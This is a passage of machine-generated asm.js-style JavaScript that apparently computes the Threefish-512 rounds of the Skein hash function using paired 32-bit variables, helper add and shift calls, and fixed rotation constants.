            La = yb(Ha | 0, La | 0, 56) | 0;
            xa = (xa | y) ^ ua;
            Ma = wb(Na | 0, ta | 0, Ka | 0, Ma | 0) | 0;
            Ka = y;
            Ha = zb(Na | 0, ta | 0, 35) | 0;
            Fa = y;
            ta = yb(Na | 0, ta | 0, 29) | 0;
            Fa = (Fa | y) ^ Ka;
            za = wb(Oa | 0, wa | 0, ka | 0, za | 0) | 0;
            ka = y;
            Na = zb(Oa | 0, wa | 0, 56) | 0;
            Ba = y;
            wa = yb(Oa | 0, wa | 0, 8) | 0;
            Ba = (Ba | y) ^ ka;
            _ = wb(aa | 0, _ | 0, Ia | 0, Ja | 0) | 0;
            aa = y;
            Oa = zb(Ia | 0, Ja | 0, 22) | 0;
            Q = y;
            Ja = yb(Ia | 0, Ja | 0, 42) | 0;
            Q = (Q | y) ^ aa;
            Ka = wb(Ma | 0, Ka | 0, x | 0, z | 0) | 0;
            Ia = y;
            xa = wb((ca | La) ^ va | 0, xa | 0, a | 0, g | 0) | 0;
            La = y;
            ka = wb(za | 0, ka | 0, h | 0, i | 0) | 0;
            ca = y;
            Q = wb((Oa | Ja) ^ _ | 0, Q | 0, j | 0, k | 0) | 0;
            Ja = y;
            aa = wb(_ | 0, aa | 0, l | 0, m | 0) | 0;
            _ = y;
            ia = wb((Na | wa) ^ za | 0, Ba | 0, Ga | 0, ia | 0) | 0;
            Ga = y;
            ua = wb(va | 0, ua | 0, Ca | 0, ga | 0) | 0;
            va = y;
            Ba = wb(t | 0, u | 0, 12, 0) | 0;
            Fa = wb(Ba | 0, y | 0, (Ha | ta) ^ Ma | 0, Fa | 0) | 0;
            Ma = y;
            Ia = wb(Ka | 0, Ia | 0, xa | 0, La | 0) | 0;
            Ka = y;
            ta = zb(xa | 0, La | 0, 46) | 0;
            Ha = y;
            La = yb(xa | 0, La | 0, 18) | 0;
            La = (ta | La) ^ Ia;
            Ha = (Ha | y) ^ Ka;
            ca = wb(ka | 0, ca | 0, Q | 0, Ja | 0) | 0;
            ka = y;
            ta = zb(Q | 0, Ja | 0, 36) | 0;
            xa = y;
            Ja = yb(Q | 0, Ja | 0, 28) | 0;
            Ja = (ta | Ja) ^ ca;
            xa = (xa | y) ^ ka;
            _ = wb(aa | 0, _ | 0, ia | 0, Ga | 0) | 0;
            aa = y;
            ta = zb(ia | 0, Ga | 0, 19) | 0;
            Q = y;
            Ga = yb(ia | 0, Ga | 0, 45) | 0;
            Ga = (ta | Ga) ^ _;
            Q = (Q | y) ^ aa;
            va = wb(ua | 0, va | 0, Fa | 0, Ma | 0) | 0;
            ua = y;
            ta = zb(Fa | 0, Ma | 0, 37) | 0;
            ia = y;
            Ma = yb(Fa | 0, Ma | 0, 27) | 0;
            Ma = (ta | Ma) ^ va;
            ia = (ia | y) ^ ua;
            ka = wb(La | 0, Ha | 0, ca | 0, ka | 0) | 0;
            ca = y;
            ta = zb(La | 0, Ha | 0, 33) | 0;
            Fa = y;
            Ha = yb(La | 0, Ha | 0, 31) | 0;
            Ha = (ta | Ha) ^ ka;
            Fa = (Fa | y) ^ ca;
            aa = wb(Ma | 0, ia | 0, _ | 0, aa | 0) | 0;
            _ = y;
            ta = zb(Ma | 0, ia | 0, 27) | 0;
            La = y;
            ia = yb(Ma | 0, ia | 0, 37) | 0;
            ia = (ta | ia) ^ aa;
            La = (La | y) ^ _;
            ua = wb(Ga | 0, Q | 0, va | 0, ua | 0) | 0;
            va = y;
            ta = zb(Ga | 0, Q | 0, 14) | 0;
            Ma = y;
            Q = yb(Ga | 0, Q | 0, 50) | 0;
            Q = (ta | Q) ^ ua;
            Ma = (Ma | y) ^ va;
            Ka = wb(Ia | 0, Ka | 0, Ja | 0, xa | 0) | 0;
            Ia = y;
            ta = zb(Ja | 0, xa | 0, 42) | 0;
            Ga = y;
            xa = yb(Ja | 0, xa | 0, 22) | 0;
            xa = (ta | xa) ^ Ka;
            Ga = (Ga | y) ^ Ia;
            _ = wb(aa | 0, _ | 0, Ha | 0, Fa | 0) | 0;
            aa = y;
            ta = zb(Ha | 0, Fa | 0, 17) | 0;
            Ja = y;
            Fa = yb(Ha | 0, Fa | 0, 47) | 0;
            Fa = (ta | Fa) ^ _;
            Ja = (Ja | y) ^ aa;
            va = wb(ua | 0, va | 0, xa | 0, Ga | 0) | 0;
            ua = y;
            ta = zb(xa | 0, Ga | 0, 49) | 0;
            Ha = y;
            Ga = yb(xa | 0, Ga | 0, 15) | 0;
            Ga = (ta | Ga) ^ va;
            Ha = (Ha | y) ^ ua;
            Ia = wb(Q | 0, Ma | 0, Ka | 0, Ia | 0) | 0;
            Ka = y;
            ta = zb(Q | 0, Ma | 0, 36) | 0;
            xa = y;
            Ma = yb(Q | 0, Ma | 0, 28) | 0;
            Ma = (ta | Ma) ^ Ia;
            xa = (xa | y) ^ Ka;
            ca = wb(ia | 0, La | 0, ka | 0, ca | 0) | 0;
            ka = y;
            ta = zb(ia | 0, La | 0, 39) | 0;
            Q = y;
            La = yb(ia | 0, La | 0, 25) | 0;
            La = (ta | La) ^ ca;
            Q = (Q | y) ^ ka;
            ua = wb(Fa | 0, Ja | 0, va | 0, ua | 0) | 0;
            va = y;
            ta = zb(Fa | 0, Ja | 0, 44) | 0;
            ia = y;
            Ja = yb(Fa | 0, Ja | 0, 20) | 0;
            ia = (ia | y) ^ va;
            Ka = wb(La | 0, Q | 0, Ia | 0, Ka | 0) | 0;
            Ia = y;
            Fa = zb(La | 0, Q | 0, 9) | 0;
            Ba = y;
            Q = yb(La | 0, Q | 0, 55) | 0;
            Ba = (Ba | y) ^ Ia;
            ka = wb(Ma | 0, xa | 0, ca | 0, ka | 0) | 0;
            ca = y;
            La = zb(Ma | 0, xa | 0, 54) | 0;
            za = y;
            xa = yb(Ma | 0, xa | 0, 10) | 0;
            za = (za | y) ^ ca;
            aa = wb(_ | 0, aa | 0, Ga | 0, Ha | 0) | 0;
            _ = y;
            Ma = zb(Ga | 0, Ha | 0, 56) | 0;
            wa = y;
            Ha = yb(Ga | 0, Ha | 0, 8) | 0;
            wa = (wa | y) ^ _;
            Ia = wb(Ka | 0, Ia | 0, a | 0, g | 0) | 0;
            Ga = y;
            ia = wb((ta | Ja) ^ ua | 0, ia | 0, h | 0, i | 0) | 0;
            Ja = y;
            ca = wb(ka | 0, ca | 0, j | 0, k | 0) | 0;
            ta = y;
            wa = wb((Ma | Ha) ^ aa | 0, wa | 0, l | 0, m | 0) | 0;
            Ha = y;
            _ = wb(aa | 0, _ | 0, qa | 0, ra | 0) | 0;
            aa = y;
            ga = wb((La | xa) ^ ka | 0, za | 0, Ca | 0, ga | 0) | 0;
            Ca = y;
            va = wb(ua | 0, va | 0, Aa | 0, sa | 0) | 0;
            ua = y;
            za = wb(v | 0, w | 0, 13, 0) | 0;
            Ba = wb(za | 0, y | 0, (Fa | Q) ^ Ka | 0, Ba | 0) | 0;
            Ka = y;
            Ga = wb(Ia | 0, Ga | 0, ia | 0, Ja | 0) | 0;
            Ia = y;
            Q = zb(ia | 0, Ja | 0, 39) | 0;
            Fa = y;
            Ja = yb(ia | 0, Ja | 0, 25) | 0;
            Ja = (Q | Ja) ^ Ga;
            Fa = (Fa | y) ^ Ia;
            ta = wb(ca | 0, ta | 0, wa | 0, Ha | 0) | 0;
            ca = y;
            Q = zb(wa | 0, Ha | 0, 30) | 0;
            ia = y;
            Ha = yb(wa | 0, Ha | 0, 34) | 0;
            Ha = (Q | Ha) ^ ta;
            ia = (ia | y) ^ ca;
            aa = wb(_ | 0, aa | 0, ga | 0, Ca | 0) | 0;
            _ = y;
            Q = zb(ga | 0, Ca | 0, 34) | 0;
            wa = y;
            Ca = yb(ga | 0, Ca | 0, 30) | 0;
            Ca = (Q | Ca) ^ aa;
            wa = (wa | y) ^ _;
            ua = wb(va | 0, ua | 0, Ba | 0, Ka | 0) | 0;
            va = y;
            Q = zb(Ba | 0, Ka | 0, 24) | 0;
            ga = y;
            Ka = yb(Ba | 0, Ka | 0, 40) | 0;
            Ka = (Q | Ka) ^ ua;
            ga = (ga | y) ^ va;
            ca = wb(Ja | 0, Fa | 0, ta | 0, ca | 0) | 0;
            ta = y;
            Q = zb(Ja | 0, Fa | 0, 13) | 0;
            Ba = y;
            Fa = yb(Ja | 0, Fa | 0, 51) | 0;
            Fa = (Q | Fa) ^ ca;
            Ba = (Ba | y) ^ ta;
            _ = wb(Ka | 0, ga | 0, aa | 0, _ | 0) | 0;
            aa = y;
            Q = zb(Ka | 0, ga | 0, 50) | 0;
            Ja = y;
            ga = yb(Ka | 0, ga | 0, 14) | 0;
            ga = (Q | ga) ^ _;
            Ja = (Ja | y) ^ aa;
            va = wb(Ca | 0, wa | 0, ua | 0, va | 0) | 0;
            ua = y;
            Q = zb(Ca | 0, wa | 0, 10) | 0;
            Ka = y;
            wa = yb(Ca | 0, wa | 0, 54) | 0;
            wa = (Q | wa) ^ va;
            Ka = (Ka | y) ^ ua;
            Ia = wb(Ga | 0, Ia | 0, Ha | 0, ia | 0) | 0;
            Ga = y;
            Q = zb(Ha | 0, ia | 0, 17) | 0;
            Ca = y;
            ia = yb(Ha | 0, ia | 0, 47) | 0;
            ia = (Q | ia) ^ Ia;
            Ca = (Ca | y) ^ Ga;
            aa = wb(_ | 0, aa | 0, Fa | 0, Ba | 0) | 0;
            _ = y;
            Q = zb(Fa | 0, Ba | 0, 25) | 0;
            Ha = y;
            Ba = yb(Fa | 0, Ba | 0, 39) | 0;
            Ba = (Q | Ba) ^ aa;
            Ha = (Ha | y) ^ _;
            ua = wb(va | 0, ua | 0, ia | 0, Ca | 0) | 0;
            va = y;
            Q = zb(ia | 0, Ca | 0, 29) | 0;
            Fa = y;
            Ca = yb(ia | 0, Ca | 0, 35) | 0;
            Ca = (Q | Ca) ^ ua;
            Fa = (Fa | y) ^ va;
            Ga = wb(wa | 0, Ka | 0, Ia | 0, Ga | 0) | 0;
            Ia = y;
            Q = zb(wa | 0, Ka | 0, 39) | 0;
            ia = y;
            Ka = yb(wa | 0, Ka | 0, 25) | 0;
            Ka = (Q | Ka) ^ Ga;
            ia = (ia | y) ^ Ia;
            ta = wb(ga | 0, Ja | 0, ca | 0, ta | 0) | 0;
            ca = y;
            Q = zb(ga | 0, Ja | 0, 43) | 0;
            wa = y;
            Ja = yb(ga | 0, Ja | 0, 21) | 0;
            Ja = (Q | Ja) ^ ta;
            wa = (wa | y) ^ ca;
            va = wb(Ba | 0, Ha | 0, ua | 0, va | 0) | 0;
            ua = y;
            Q = zb(Ba | 0, Ha | 0, 8) | 0;
            ga = y;
            Ha = yb(Ba | 0, Ha | 0, 56) | 0;
            ga = (ga | y) ^ ua;
            Ia = wb(Ja | 0, wa | 0, Ga | 0, Ia | 0) | 0;
            Ga = y;
            Ba = zb(Ja | 0, wa | 0, 35) | 0;
            za = y;
            wa = yb(Ja | 0, wa | 0, 29) | 0;
            za = (za | y) ^ Ga;
            ca = wb(Ka | 0, ia | 0, ta | 0, ca | 0) | 0;
            ta = y;
            Ja = zb(Ka | 0, ia | 0, 56) | 0;
            ka = y;
            ia = yb(Ka | 0, ia | 0, 8) | 0;
            ka = (ka | y) ^ ta;
            _ = wb(aa | 0, _ | 0, Ca | 0, Fa | 0) | 0;
            aa = y;
            Ka = zb(Ca | 0, Fa | 0, 22) | 0;
            xa = y;
            Fa = yb(Ca | 0, Fa | 0, 42) | 0;
            xa = (xa | y) ^ aa;
            Ga = wb(Ia | 0, Ga | 0, h | 0, i | 0) | 0;
            Ca = y;
            ga = wb((Q | Ha) ^ va | 0, ga | 0, j | 0, k | 0) | 0;
            Ha = y;
            ta = wb(ca | 0, ta | 0, l | 0, m | 0) | 0;
            Q = y;
            xa = wb((Ka | Fa) ^ _ | 0, xa | 0, qa | 0, ra | 0) | 0;
            Fa = y;
            aa = wb(_ | 0, aa | 0, r | 0, s | 0) | 0;
            _ = y;
            sa = wb((Ja | ia) ^ ca | 0, ka | 0, Aa | 0, sa | 0) | 0;
            Aa = y;
            ua = wb(va | 0, ua | 0, Da | 0, ea | 0) | 0;
            va = y;
            ka = wb(x | 0, z | 0, 14, 0) | 0;
            za = wb(ka | 0, y | 0, (Ba | wa) ^ Ia | 0, za | 0) | 0;
            Ia = y;
            Ca = wb(Ga | 0, Ca | 0, ga | 0, Ha | 0) | 0;
            Ga = y;
            wa = zb(ga | 0, Ha | 0, 46) | 0;
            Ba = y;
            Ha = yb(ga | 0, Ha | 0, 18) | 0;
            Ha = (wa | Ha) ^ Ca;
            Ba = (Ba | y) ^ Ga;
            Q = wb(ta | 0, Q | 0, xa | 0, Fa | 0) | 0;
            ta = y;
            wa = zb(xa | 0, Fa | 0, 36) | 0;
            ga = y;
            Fa = yb(xa | 0, Fa | 0, 28) | 0;
            Fa = (wa | Fa) ^ Q;
            ga = (ga | y) ^ ta;
            _ = wb(aa | 0, _ | 0, sa | 0, Aa | 0) | 0;
            aa = y;
            wa = zb(sa | 0, Aa | 0, 19) | 0;
            xa = y;
            Aa = yb(sa | 0, Aa | 0, 45) | 0;
            Aa = (wa | Aa) ^ _;
            xa = (xa | y) ^ aa;
            va = wb(ua | 0, va | 0, za | 0, Ia | 0) | 0;
            ua = y;
            wa = zb(za | 0, Ia | 0, 37) | 0;
            sa = y;
            Ia = yb(za | 0, Ia | 0, 27) | 0;
            Ia = (wa | Ia) ^ va;
            sa = (sa | y) ^ ua;
            ta = wb(Ha | 0, Ba | 0, Q | 0, ta | 0) | 0;
            Q = y;
            wa = zb(Ha | 0, Ba | 0, 33) | 0;
            za = y;
            Ba = yb(Ha | 0, Ba | 0, 31) | 0;
            Ba = (wa | Ba) ^ ta;
            za = (za | y) ^ Q;
            aa = wb(Ia | 0, sa | 0, _ | 0, aa | 0) | 0;
            _ = y;
            wa = zb(Ia | 0, sa | 0, 27) | 0;
            Ha = y;
            sa = yb(Ia | 0, sa | 0, 37) | 0;
            sa = (wa | sa) ^ aa;
            Ha = (Ha | y) ^ _;
            ua = wb(Aa | 0, xa | 0, va | 0, ua | 0) | 0;
            va = y;
            wa = zb(Aa | 0, xa | 0, 14) | 0;
            Ia = y;
            xa = yb(Aa | 0, xa | 0, 50) | 0;
            xa = (wa | xa) ^ ua;
            Ia = (Ia | y) ^ va;
            Ga = wb(Ca | 0, Ga | 0, Fa | 0, ga | 0) | 0;
            Ca = y;
            wa = zb(Fa | 0, ga | 0, 42) | 0;
            Aa = y;
            ga = yb(Fa | 0, ga | 0, 22) | 0;
            ga = (wa | ga) ^ Ga;
            Aa = (Aa | y) ^ Ca;
            _ = wb(aa | 0, _ | 0, Ba | 0, za | 0) | 0;
            aa = y;
            wa = zb(Ba | 0, za | 0, 17) | 0;
            Fa = y;
            za = yb(Ba | 0, za | 0, 47) | 0;
            za = (wa | za) ^ _;
            Fa = (Fa | y) ^ aa;
            va = wb(ua | 0, va | 0, ga | 0, Aa | 0) | 0;
            ua = y;
            wa = zb(ga | 0, Aa | 0, 49) | 0;
            Ba = y;
            Aa = yb(ga | 0, Aa | 0, 15) | 0;
            Aa = (wa | Aa) ^ va;
            Ba = (Ba | y) ^ ua;
            Ca = wb(xa | 0, Ia | 0, Ga | 0, Ca | 0) | 0;
            Ga = y;
            wa = zb(xa | 0, Ia | 0, 36) | 0;
            ga = y;
            Ia = yb(xa | 0, Ia | 0, 28) | 0;
            Ia = (wa | Ia) ^ Ca;
            ga = (ga | y) ^ Ga;
            Q = wb(sa | 0, Ha | 0, ta | 0, Q | 0) | 0;
            ta = y;
            wa = zb(sa | 0, Ha | 0, 39) | 0;
            xa = y;
            Ha = yb(sa | 0, Ha | 0, 25) | 0;
            Ha = (wa | Ha) ^ Q;
            xa = (xa | y) ^ ta;
            ua = wb(za | 0, Fa | 0, va | 0, ua | 0) | 0;
            va = y;
            wa = zb(za | 0, Fa | 0, 44) | 0;
            sa = y;
            Fa = yb(za | 0, Fa | 0, 20) | 0;
            sa = (sa | y) ^ va;
            Ga = wb(Ha | 0, xa | 0, Ca | 0, Ga | 0) | 0;
            Ca = y;
            za = zb(Ha | 0, xa | 0, 9) | 0;
            ka = y;
            xa = yb(Ha | 0, xa | 0, 55) | 0;
            ka = (ka | y) ^ Ca;
            ta = wb(Ia | 0, ga | 0, Q | 0, ta | 0) | 0;
            Q = y;
            Ha = zb(Ia | 0, ga | 0, 54) | 0;
            ca = y;
            ga = yb(Ia | 0, ga | 0, 10) | 0;
            ca = (ca | y) ^ Q;
            aa = wb(_ | 0, aa | 0, Aa | 0, Ba | 0) | 0;
            _ = y;
            Ia = zb(Aa | 0, Ba | 0, 56) | 0;
            ia = y;
            Ba = yb(Aa | 0, Ba | 0, 8) | 0;
            ia = (ia | y) ^ _;
            Ca = wb(Ga | 0, Ca | 0, j | 0, k | 0) | 0;
            Aa = y;
            sa = wb((wa | Fa) ^ ua | 0, sa | 0, l | 0, m | 0) | 0;
            Fa = y;
            Q = wb(ta | 0, Q | 0, qa | 0, ra | 0) | 0;
            wa = y;
            ia = wb((Ia | Ba) ^ aa | 0, ia | 0, r | 0, s | 0) | 0;
            Ba = y;
            _ = wb(aa | 0, _ | 0, t | 0, u | 0) | 0;
            aa = y;
            ea = wb((Ha | ga) ^ ta | 0, ca | 0, Da | 0, ea | 0) | 0;
            Da = y;
            va = wb(ua | 0, va | 0, Ea | 0, ya | 0) | 0;
            ua = y;
            ca = wb(a | 0, g | 0, 15, 0) | 0;
            ka = wb(ca | 0, y | 0, (za | xa) ^ Ga | 0, ka | 0) | 0;
            Ga = y;
            Aa = wb(Ca | 0, Aa | 0, sa | 0, Fa | 0) | 0;
            Ca = y;
            xa = zb(sa | 0, Fa | 0, 39) | 0;
            za = y;
            Fa = yb(sa | 0, Fa | 0, 25) | 0;
            Fa = (xa | Fa) ^ Aa;
            za = (za | y) ^ Ca;
            wa = wb(Q | 0, wa | 0, ia | 0, Ba | 0) | 0;
            Q = y;
            xa = zb(ia | 0, Ba | 0, 30) | 0;
            sa = y;
            Ba = yb(ia | 0, Ba | 0, 34) | 0;
            Ba = (xa | Ba) ^ wa;
            sa = (sa | y) ^ Q;
            aa = wb(_ | 0, aa | 0, ea | 0, Da | 0) | 0;
            _ = y;
            xa = zb(ea | 0, Da | 0, 34) | 0;
            ia = y;
            Da = yb(ea | 0, Da | 0, 30) | 0;
            Da = (xa | Da) ^ aa;
            ia = (ia | y) ^ _;
            ua = wb(va | 0, ua | 0, ka | 0, Ga | 0) | 0;
            va = y;
            xa = zb(ka | 0, Ga | 0, 24) | 0;
            ea = y;
            Ga = yb(ka | 0, Ga | 0, 40) | 0;
            Ga = (xa | Ga) ^ ua;
            ea = (ea | y) ^ va;
            Q = wb(Fa | 0, za | 0, wa | 0, Q | 0) | 0;
            wa = y;
            xa = zb(Fa | 0, za | 0, 13) | 0;
            ka = y;
            za = yb(Fa | 0, za | 0, 51) | 0;
            za = (xa | za) ^ Q;
            ka = (ka | y) ^ wa;
            _ = wb(Ga | 0, ea | 0, aa | 0, _ | 0) | 0;
            aa = y;
            xa = zb(Ga | 0, ea | 0, 50) | 0;
            Fa = y;
            ea = yb(Ga | 0, ea | 0, 14) | 0;
            ea = (xa | ea) ^ _;
            Fa = (Fa | y) ^ aa;
            va = wb(Da | 0, ia | 0, ua | 0, va | 0) | 0;
            ua = y;
            xa = zb(Da | 0, ia | 0, 10) | 0;
            Ga = y;
            ia = yb(Da | 0, ia | 0, 54) | 0;
            ia = (xa | ia) ^ va;
            Ga = (Ga | y) ^ ua;
            Ca = wb(Aa | 0, Ca | 0, Ba | 0, sa | 0) | 0;
            Aa = y;
            xa = zb(Ba | 0, sa | 0, 17) | 0;
            Da = y;
            sa = yb(Ba | 0, sa | 0, 47) | 0;
            sa = (xa | sa) ^ Ca;
            Da = (Da | y) ^ Aa;
            aa = wb(_ | 0, aa | 0, za | 0, ka | 0) | 0;
            _ = y;
            xa = zb(za | 0, ka | 0, 25) | 0;
            Ba = y;
            ka = yb(za | 0, ka | 0, 39) | 0;
            ka = (xa | ka) ^ aa;
            Ba = (Ba | y) ^ _;
            ua = wb(va | 0, ua | 0, sa | 0, Da | 0) | 0;
            va = y;
            xa = zb(sa | 0, Da | 0, 29) | 0;
            za = y;
            Da = yb(sa | 0, Da | 0, 35) | 0;
            Da = (xa | Da) ^ ua;
            za = (za | y) ^ va;
            Aa = wb(ia | 0, Ga | 0, Ca | 0, Aa | 0) | 0;
            Ca = y;
            xa = zb(ia | 0, Ga | 0, 39) | 0;
            sa = y;
            Ga = yb(ia | 0, Ga | 0, 25) | 0;
            Ga = (xa | Ga) ^ Aa;
            sa = (sa | y) ^ Ca;
            wa = wb(ea | 0, Fa | 0, Q | 0, wa | 0) | 0;
            Q = y;
            xa = zb(ea | 0, Fa | 0, 43) | 0;
            ia = y;
            Fa = yb(ea | 0, Fa | 0, 21) | 0;
            Fa = (xa | Fa) ^ wa;
            ia = (ia | y) ^ Q;
            va = wb(ka | 0, Ba | 0, ua | 0, va | 0) | 0;
            ua = y;
            xa = zb(ka | 0, Ba | 0, 8) | 0;
            ea = y;
            Ba = yb(ka | 0, Ba | 0, 56) | 0;
            ea = (ea | y) ^ ua;
            Ca = wb(Fa | 0, ia | 0, Aa | 0, Ca | 0) | 0;
            Aa = y;
            ka = zb(Fa | 0, ia | 0, 35) | 0;
            ca = y;
            ia = yb(Fa | 0, ia | 0, 29) | 0;
            ca = (ca | y) ^ Aa;
            Q = wb(Ga | 0, sa | 0, wa | 0, Q | 0) | 0;
            wa = y;
            Fa = zb(Ga | 0, sa | 0, 56) | 0;
            ta = y;
            sa = yb(Ga | 0, sa | 0, 8) | 0;
            ta = (ta | y) ^ wa;
            _ = wb(aa | 0, _ | 0, Da | 0, za | 0) | 0;
            aa = y;
            Ga = zb(Da | 0, za | 0, 22) | 0;
            ga = y;
            za = yb(Da | 0, za | 0, 42) | 0;
            ga = (ga | y) ^ aa;
            Aa = wb(Ca | 0, Aa | 0, l | 0, m | 0) | 0;
            Da = y;
            ea = wb((xa | Ba) ^ va | 0, ea | 0, qa | 0, ra | 0) | 0;
            Ba = y;
            wa = wb(Q | 0, wa | 0, r | 0, s | 0) | 0;
            xa = y;
            ga = wb((Ga | za) ^ _ | 0, ga | 0, t | 0, u | 0) | 0;
            za = y;
            aa = wb(_ | 0, aa | 0, v | 0, w | 0) | 0;
            _ = y;
            ya = wb((Fa | sa) ^ Q | 0, ta | 0, Ea | 0, ya | 0) | 0;
            Ea = y;
            ua = wb(va | 0, ua | 0, oa | 0, ma | 0) | 0;
            va = y;
            ta = wb(h | 0, i | 0, 16, 0) | 0;
            ca = wb(ta | 0, y | 0, (ka | ia) ^ Ca | 0, ca | 0) | 0;
            Ca = y;
            Da = wb(Aa | 0, Da | 0, ea | 0, Ba | 0) | 0;
            Aa = y;
            ia = zb(ea | 0, Ba | 0, 46) | 0;
            ka = y;
            Ba = yb(ea | 0, Ba | 0, 18) | 0;
            Ba = (ia | Ba) ^ Da;
            ka = (ka | y) ^ Aa;
            xa = wb(wa | 0, xa | 0, ga | 0, za | 0) | 0;
            wa = y;
            ia = zb(ga | 0, za | 0, 36) | 0;
            ea = y;
            za = yb(ga | 0, za | 0, 28) | 0;
            za = (ia | za) ^ xa;
            ea = (ea | y) ^ wa;
            _ = wb(aa | 0, _ | 0, ya | 0, Ea | 0) | 0;
            aa = y;
            ia = zb(ya | 0, Ea | 0, 19) | 0;
            ga = y;
            Ea = yb(ya | 0, Ea | 0, 45) | 0;
            Ea = (ia | Ea) ^ _;
            ga = (ga | y) ^ aa;
            va = wb(ua | 0, va | 0, ca | 0, Ca | 0) | 0;
            ua = y;
            ia = zb(ca | 0, Ca | 0, 37) | 0;
            ya = y;
            Ca = yb(ca | 0, Ca | 0, 27) | 0;
            Ca = (ia | Ca) ^ va;
            ya = (ya | y) ^ ua;
            wa = wb(Ba | 0, ka | 0, xa | 0, wa | 0) | 0;
            xa = y;
            ia = zb(Ba | 0, ka | 0, 33) | 0;
            ca = y;
            ka = yb(Ba | 0, ka | 0, 31) | 0;
            ka = (ia | ka) ^ wa;
            ca = (ca | y) ^ xa;
            aa = wb(Ca | 0, ya | 0, _ | 0, aa | 0) | 0;
            _ = y;
            ia = zb(Ca | 0, ya | 0, 27) | 0;
            Ba = y;
            ya = yb(Ca | 0, ya | 0, 37) | 0;
            ya = (ia | ya) ^ aa;
            Ba = (Ba | y) ^ _;
            ua = wb(Ea | 0, ga | 0, va | 0, ua | 0) | 0;
            va = y;
            ia = zb(Ea | 0, ga | 0, 14) | 0;
            Ca = y;
            ga = yb(Ea | 0, ga | 0, 50) | 0;
            ga = (ia | ga) ^ ua;
            Ca = (Ca | y) ^ va;
            Aa = wb(Da | 0, Aa | 0, za | 0, ea | 0) | 0;
            Da = y;
            ia = zb(za | 0, ea | 0, 42) | 0;
            Ea = y;
            ea = yb(za | 0, ea | 0, 22) | 0;
            ea = (ia | ea) ^ Aa;
            Ea = (Ea | y) ^ Da;
            _ = wb(aa | 0, _ | 0, ka | 0, ca | 0) | 0;
            aa = y;
            ia = zb(ka | 0, ca | 0, 17) | 0;
            za = y;
            ca = yb(ka | 0, ca | 0, 47) | 0;
            ca = (ia | ca) ^ _;
            za = (za | y) ^ aa;
            va = wb(ua | 0, va | 0, ea | 0, Ea | 0) | 0;
            ua = y;
            ia = zb(ea | 0, Ea | 0, 49) | 0;
            ka = y;
            Ea = yb(ea | 0, Ea | 0, 15) | 0;
            Ea = (ia | Ea) ^ va;
            ka = (ka | y) ^ ua;
            Da = wb(ga | 0, Ca | 0, Aa | 0, Da | 0) | 0;
            Aa = y;
            ia = zb(ga | 0, Ca | 0, 36) | 0;
            ea = y;
            Ca = yb(ga | 0, Ca | 0, 28) | 0;
            Ca = (ia | Ca) ^ Da;
            ea = (ea | y) ^ Aa;
            xa = wb(ya | 0, Ba | 0, wa | 0, xa | 0) | 0;
            wa = y;
            ia = zb(ya | 0, Ba | 0, 39) | 0;
            ga = y;
            Ba = yb(ya | 0, Ba | 0, 25) | 0;
            Ba = (ia | Ba) ^ xa;
            ga = (ga | y) ^ wa;
            ua = wb(ca | 0, za | 0, va | 0, ua | 0) | 0;
            va = y;
            ia = zb(ca | 0, za | 0, 44) | 0;
            ya = y;
            za = yb(ca | 0, za | 0, 20) | 0;
            ya = (ya | y) ^ va;
            Aa = wb(Ba | 0, ga | 0, Da | 0, Aa | 0) | 0;
            Da = y;
            ca = zb(Ba | 0, ga | 0, 9) | 0;
            ta = y;
            ga = yb(Ba | 0, ga | 0, 55) | 0;
            ta = (ta | y) ^ Da;
            wa = wb(Ca | 0, ea | 0, xa | 0, wa | 0) | 0;
            xa = y;
            Ba = zb(Ca | 0, ea | 0, 54) | 0;
            Q = y;
            ea = yb(Ca | 0, ea | 0, 10) | 0;
            Q = (Q | y) ^ xa;
            aa = wb(_ | 0, aa | 0, Ea | 0, ka | 0) | 0;
            _ = y;
            Ca = zb(Ea | 0, ka | 0, 56) | 0;
            sa = y;
            ka = yb(Ea | 0, ka | 0, 8) | 0;
            sa = (sa | y) ^ _;
            ra = wb(Aa | 0, Da | 0, qa | 0, ra | 0) | 0;
            qa = y;
            ya = wb((ia | za) ^ ua | 0, ya | 0, r | 0, s | 0) | 0;
            za = y;
            xa = wb(wa | 0, xa | 0, t | 0, u | 0) | 0;
            ia = y;
            sa = wb((Ca | ka) ^ aa | 0, sa | 0, v | 0, w | 0) | 0;
            ka = y;
            _ = wb(aa | 0, _ | 0, x | 0, z | 0) | 0;
            aa = y;
            ma = wb((Ba | ea) ^ wa | 0, Q | 0, oa | 0, ma | 0) | 0;
            oa = y;
            va = wb(ua | 0, va | 0, W | 0, Y | 0) | 0;
            ua = y;
            Q = wb(j | 0, k | 0, 17, 0) | 0;
            ta = wb(Q | 0, y | 0, (ca | ga) ^ Aa | 0, ta | 0) | 0;
            Aa = y;
            qa = wb(ra | 0, qa | 0, ya | 0, za | 0) | 0;
            ra = y;
            ga = zb(ya | 0, za | 0, 39) | 0;
            ca = y;
            za = yb(ya | 0, za | 0, 25) | 0;
            za = (ga | za) ^ qa;
            ca = (ca | y) ^ ra;
            ia = wb(xa | 0, ia | 0, sa | 0, ka | 0) | 0;
            xa = y;
            ga = zb(sa | 0, ka | 0, 30) | 0;
            ya = y;
            ka = yb(sa | 0, ka | 0, 34) | 0;
            ka = (ga | ka) ^ ia;
            ya = (ya | y) ^ xa;
            aa = wb(_ | 0, aa | 0, ma | 0, oa | 0) | 0;
            _ = y;
            ga = zb(ma | 0, oa | 0, 34) | 0;
            sa = y;
            oa = yb(ma | 0, oa | 0, 30) | 0;
            oa = (ga | oa) ^ aa;
            sa = (sa | y) ^ _;
            ua = wb(va | 0, ua | 0, ta | 0, Aa | 0) | 0;
            va = y;
            ga = zb(ta | 0, Aa | 0, 24) | 0;
            ma = y;
            Aa = yb(ta | 0, Aa | 0, 40) | 0;
            Aa = (ga | Aa) ^ ua;
            ma = (ma | y) ^ va;
            xa = wb(za | 0, ca | 0, ia | 0, xa | 0) | 0;
            ia = y;
            ga = zb(za | 0, ca | 0, 13) | 0;
            ta = y;
            ca = yb(za | 0, ca | 0, 51) | 0;
            ca = (ga | ca) ^ xa;
            ta = (ta | y) ^ ia;
            _ = wb(Aa | 0, ma | 0, aa | 0, _ | 0) | 0;
            aa = y;
            ga = zb(Aa | 0, ma | 0, 50) | 0;
            za = y;
            ma = yb(Aa | 0, ma | 0, 14) | 0;
            ma = (ga | ma) ^ _;
            za = (za | y) ^ aa;
            va = wb(oa | 0, sa | 0, ua | 0, va | 0) | 0;
            ua = y;
            ga = zb(oa | 0, sa | 0, 10) | 0;
            Aa = y;
            sa = yb(oa | 0, sa | 0, 54) | 0;
            sa = (ga | sa) ^ va;
            Aa = (Aa | y) ^ ua;
